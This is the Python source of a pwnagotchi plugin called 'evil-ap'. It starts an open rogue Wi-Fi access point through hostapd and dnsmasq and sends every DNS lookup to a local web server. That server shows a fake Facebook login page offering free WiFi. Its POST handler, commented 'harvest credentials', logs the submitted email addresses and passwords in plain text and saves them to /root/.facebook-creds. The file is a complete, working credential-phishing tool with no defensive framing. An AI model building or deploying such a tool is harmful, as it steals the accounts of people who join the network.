import time
import logging
import subprocess
import _thread
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from pwnagotchi import plugins
from pwnagotchi.utils import get_installed_packages
from pwnagotchi.utils import StatusFile

HOSTAPD_CONFIG = """
interface={iface}
driver={driver}
ssid={ssid}
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""

HTML_RESPONSE = """
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Wifi-Login</title>
        <style type="text/css">
            body { text-align: center; padding: 10%; font: 20px San Francisco, sans-serif; color: #ffffff; background-color: #3b5998; }
            h1 { font-size: 50px; margin: 0; text-align: center;}
            p { text-align: center;}
            laben, input { display: block; }
            #wrapper { text-align: center; }
            #login { display: inline-block; }
            img { display: block; margin-left: auto; margin-right: auto; max-width: 100%; max-height: 100vh; height: auto;}
            article { display: block; text-align: left; max-width: 650px; margin: 0 auto; }
            @media only screen and (max-width : 480px) {
                h1 { font-size: 40px; }
            }
        </style>
    </head>

    <body>
            <article>
                <img src="data:image/png;base64,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
GdDc5tyGPD7eagT6+yDI3xdBAT4I8vc5exZ45neuVivh46U+2wCpy2BCT08vmtsMaGnrRkNLFxqa
O9HX597vO41aiVC9FhEhOvjrvKFWKX/0vur/23R1m9DU2oXaxg60dbjPUq2BaH29EB6iRUiQH/y1
3lCplGc3R+ro6kFfnwWtHQY0NnfhdEO78Da0I9m4zGiMz4yGzs8LZSebsXVPGVo73P/WBMBAJyIi
kgVOiiMiIpIBBjoREZEMMNCJiIhkgIFOREQkAwx0IiIiGWCgExERyQADnYiISAYY6ERERDLAQCci
IpIBBjoREZEMMNCJiIhkgIFOREQkAwx0IiIiGWCgExERyQADnYiISAYY6ERERDLAQCciIpIBBjoR
EZEMMNCJiIhkgIFOREQkAwx0IiIiGWCgExERyQADnYiISAYY6ERERDLAQCciIpIBBjoREZEMMNCJ
iIhkgIFOREQkAwx0IiIiGWCgExERyQADnYiISAYY6ERERDLAQCciIpIBBjoREZEMMNCJiIhkgIFO
REQkAwx0IiIiGWCgExERyQADnYiISAYY6ERERDLAQCciIpIBBjoREZEMMNCJiIhkgIFOREQkAwx0
IiIiGWCgExERyQADnYiISAYY6ERERDLAQCciIpIBBjoREZEMMNCJiIhkgIFOREQkA/8HVFetefkh
sX4AAAAASUVORK5CYII=">
                <h1>Use facebook to get free WiFi!</h1>
                <p>Please login with your facebook account and like our site,</p>
                <p>afterwards you will be able to use our WiFi.</p>
                <div id="wrapper">
                    <form action="/" id="login" method="POST">
                        <label for="email">E-Mail</label>
                        <input type="text" name="email" id="email">

                        <label for="password">Password</label>
                        <input type="password" name="password" id="password">

                        <button type="submit">Login</button>
                    </form>
                </div>
            </article>
    </body>
</html>
"""

creds_file = StatusFile('/root/.facebook-creds', data_format='json')

class FischHttpHandler(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_response()
        self.wfile.write(bytes(HTML_RESPONSE, "utf8"))

    def do_POST(self):
        # harvest credentials
        global creds_file
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        if post_data:
            try:
                parsed = parse_qs(post_data.decode('utf-8'))
                email, password = parsed['email'], parsed['password']
                logging.info("Got credentials: email: %s password: %s", email, password)
                credentials = creds_file.data_field_or('credentials', default=list())
                credentials.append((email,password))
                creds_file.update(data={'credentials': credentials})
            except Exception as ex:
                logging.error(ex)

        self.send_error(404)

class EvilAp(plugins.Plugin):
    __author__ = '33197631+dadav@users.noreply.github.com'
    __version__ = '0.0.1'
    __name__ = 'evil-ap'
    __license__ = 'GPL3'
    __description__ = 'This plugin creates an evil accesspoint while pwnagotchi is sad.'

    def __init__(self):
        self.ready = False

    @staticmethod
    def check_requirements():
        requirements = set(['dnsmasq', 'hostapd'])
        installed = set(get_installed_packages())
        return requirements.issubset(installed)

    def on_loaded(self):
        self.ready = EvilAp.check_requirements()
        logging.info("[evil-ap] %s", "is loaded." if self.ready else "could not be loaded (missing required packages).")

    def on_ready(self, agent):
        if not self.ready:
            return

        cfg = agent.config()
        display = agent.view()

        display.set('status', 'Starting evil AP')
        display.set('face', '( •̀ᴗ•́ )')
        display.update(force=True)

        logging.debug("[evil-ap] Configure ip addresses...")
        for ip in ['192.168.4.1', '192.168.4.100']:
            ip_proc = subprocess.Popen(f"ip addr add {ip}/255.255.255.0 dev {self.options['iface']}".split(),
                    shell=False, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))
            ip_proc.wait()

        # webserver
        logging.debug("[evil-ap] Start webserver with phishing site...")
        web = HTTPServer(('192.168.4.100', 80), FischHttpHandler)
        web_thread = _thread.start_new_thread(web.serve_forever, ())

        dev_null = open("/dev/null", "w")
        dnsmasq = [
            "dnsmasq",
            "--no-hosts", # don't read the hostnames in /etc/hosts.
            "--interface=%s" % self.options['iface'], # listen on this interface
            "--no-poll", # Don't poll /etc/resolv.conf for changes.
            "--no-resolv",
            "--dhcp-range=192.168.4.2,192.168.4.99,255.255.255.0,24h",
            "--dhcp-option=3,192.168.4.1", # gateway
            "--dhcp-option=6,192.168.4.1", # dns-server
            "--address=/#/192.168.4.100"
        ]
        logging.debug("[evil-ap] Start dnsmasq...")
        dns_proc = subprocess.Popen(dnsmasq, shell=False, stdout=dev_null, stdin=None, stderr=dev_null)

        hostap_cfg = HOSTAPD_CONFIG.format(**self.options)
        hostapd = [
            "hostapd",
            "-B",
            "/dev/stdin"
        ]
        logging.debug("[evil-ap] Start hostapd...")

        hostapd_proc = subprocess.Popen(hostapd, shell=False, stdout=dev_null, stdin=subprocess.PIPE, stderr=dev_null)
        hostapd_proc.communicate(input=str.encode(hostap_cfg))
